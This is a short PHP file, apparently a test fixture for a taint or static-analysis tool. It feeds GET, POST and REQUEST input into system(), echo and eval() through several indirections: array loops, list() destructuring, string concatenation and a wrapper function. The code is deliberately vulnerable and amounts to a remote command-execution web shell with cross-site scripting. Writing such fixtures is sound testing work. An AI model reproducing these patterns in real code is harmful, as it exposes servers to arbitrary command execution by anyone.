<?php
foreach ($_GET['items'] as $it) { system($it); }
foreach ($_POST as $k => $v) { echo $v; }
$raw = $_GET['x'];
list($p, $q) = [$raw, "safe"];
system($p);
$cmd = "prefix ";
$cmd .= $_GET['suffix'];
system($cmd);
function wrap($a) { return $a; }
eval(wrap($_REQUEST['code']));
